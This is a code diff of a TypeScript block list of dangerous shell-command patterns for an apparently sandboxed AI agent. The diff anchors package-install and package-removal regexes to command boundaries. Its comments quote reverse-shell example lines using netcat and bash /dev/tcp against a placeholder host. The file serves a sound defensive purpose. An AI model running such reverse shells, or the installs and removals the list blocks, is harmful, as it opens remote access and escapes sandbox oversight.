@@ -328,58 +328,60 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // Anchored to command-start boundaries (^, ;, &, |) — same rationale as find-exec-shell above.
   { pattern: /(?:^|[;&|]\s*)\bfind\b.*-delete\b/, category: "find-exec-destructive" },
   // Untrusted package installation — adding deps pulls arbitrary code
-  { pattern: /\bpnpm\s+add\b/, category: "untrusted-package-installation" },
-  { pattern: /\bpnpm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
-  { pattern: /\bnpm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
-  { pattern: /\byarn\s+add\b/, category: "untrusted-package-installation" },
+  // Anchored to command-start boundaries (^, ;, &, |) to avoid false positives when package
+  // manager subcommands appear as grep/echo arguments, e.g. grep 'pnpm add react' README.md.
+  { pattern: /(?:^|[;&|]\s*)pnpm\s+add\b/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)pnpm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)npm\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)yarn\s+add\b/, category: "untrusted-package-installation" },
   // bun add — Bun's package installation command, equivalent to yarn add
-  { pattern: /\bbun\s+add\b/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)bun\s+add\b/, category: "untrusted-package-installation" },
   // bun install <pkg> / bun i <pkg> — Bun's install subcommand with a package argument;
   // bare `bun install` (no package name) is a lockfile-only operation and remains allowed.
-  { pattern: /\bbun\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)bun\s+(?:install|i)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // pip / pip3 install <pkg> — Python package installation pulls arbitrary code from PyPI.
   // Matches pip install and pip3 install with optional flags before the package name.
   // bare `pip install` (no package name) is blocked too since the pattern requires a pkg token.
-  { pattern: /\bpip3?\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)pip3?\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // python -m pip install <pkg> — pip invoked as a Python module bypasses the pip-command guard above.
   // e.g. `python3 -m pip install evil` or `python -m pip install --user evil`
   // Also covers python3 -m ensurepip which bootstraps/upgrades pip itself from remote sources.
-  { pattern: /\bpython3?\s+-m\s+pip\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
-  { pattern: /\bpython3?\s+-m\s+ensurepip\b/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)python3?\s+-m\s+pip\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)python3?\s+-m\s+ensurepip\b/, category: "untrusted-package-installation" },
   // cargo install <pkg> — Rust crate installation pulls arbitrary code from crates.io.
   // Matches cargo install with optional flags before the crate name.
-  { pattern: /\bcargo\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)cargo\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // gem install <pkg> — Ruby gem installation pulls arbitrary code from rubygems.org.
   // Matches gem install with optional flags before the gem name.
-  { pattern: /\bgem\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)gem\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // go install / go get <pkg> — Go module installation pulls arbitrary code from public registries.
   // Matches both subcommands with optional flags before the module path.
-  { pattern: /\bgo\s+(?:install|get)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)go\s+(?:install|get)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // apt / apt-get install <pkg> — Debian/Ubuntu system-level package installation. Installs
   // persistent OS binaries that outlast the evolution cycle and bypass the sandbox.
-  { pattern: /\bapt(?:-get)?\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)apt(?:-get)?\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // brew install <pkg> — Homebrew macOS/Linux package manager; installs persistent system binaries.
-  { pattern: /\bbrew\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)brew\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // snap install <pkg> — Snap package manager installs persistent system-level applications.
-  { pattern: /\bsnap\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)snap\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // apt/apt-get remove/purge/autoremove <pkg> — Removing system-level packages can destroy
   // build tooling Bloom depends on (e.g. git, node), with no recovery path within the cycle.
-  { pattern: /\bapt(?:-get)?\s+(?:remove|purge|autoremove)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
+  { pattern: /(?:^|[;&|]\s*)apt(?:-get)?\s+(?:remove|purge|autoremove)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
   // brew uninstall <pkg> — Homebrew package removal; can silently destroy persistent OS-level
   // tooling that the evolution cycle depends on.
-  { pattern: /\bbrew\s+uninstall\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
+  { pattern: /(?:^|[;&|]\s*)brew\s+uninstall\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
   // snap remove/revert <pkg> — Snap removal or version-revert can destroy persistent system
   // applications without a recovery path inside the cycle.
-  { pattern: /\bsnap\s+(?:remove|revert)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
+  { pattern: /(?:^|[;&|]\s*)snap\s+(?:remove|revert)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
   // brew upgrade <pkg> — Upgrading a named Homebrew package fetches and installs remote code,
   // functionally equivalent to a fresh install. bare `brew upgrade` (no package) is allowed.
-  { pattern: /\bbrew\s+upgrade\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)brew\s+upgrade\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // apt/apt-get upgrade <pkg> — Named package upgrade pulls and installs remote code.
   // bare `apt upgrade` / `apt-get upgrade` (full system upgrade, no package token) is allowed.
-  { pattern: /\bapt(?:-get)?\s+upgrade\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)apt(?:-get)?\s+upgrade\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // snap refresh <pkg> — Named snap refresh fetches and installs remote code from the Snap Store.
   // bare `snap refresh` (refreshes all installed snaps) is allowed.
-  { pattern: /\bsnap\s+refresh\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  { pattern: /(?:^|[;&|]\s*)snap\s+refresh\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
   // Reverse shell vectors — no download step; these directly open an outbound shell session:
   // nc -e /bin/bash evil.com 4444  — netcat with -e flag spawns a shell on connect
   // bash -i >& /dev/tcp/evil.com/4444 0>&1  — bash built-in TCP redirect (no external tool needed)
